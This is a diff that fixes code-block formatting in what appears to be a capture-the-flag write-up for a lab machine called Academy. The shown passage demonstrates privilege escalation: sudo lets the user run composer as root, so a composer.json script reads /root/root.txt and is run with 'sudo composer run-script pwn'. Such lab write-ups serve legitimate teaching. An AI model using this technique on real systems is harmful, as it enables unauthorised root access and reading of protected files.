@@ -168,7 +168,7 @@ Matching Defaults entries for mrb3n on academy:
 
 User mrb3n may run the following commands on academy:
     (ALL) /usr/bin/composer
-    ```
+```
 
 We are able to run composer as root. So we'll create a new directory, create
 a "composer.json" file and add it a script that will exfil the root.txt,
@@ -180,9 +180,9 @@ mrb3n@academy:/tmp/.hid$ cat composer.json
  "scripts": {
     "pwn": "cat /root/root.txt | wc -c"
      }
-     }
-     mrb3n@academy:/tmp/.hid$ sudo composer run-script pwn
-     33
-     ```
+  }
+mrb3n@academy:/tmp/.hid$ sudo composer run-script pwn
+33
+```
 
 We've owned the root account.
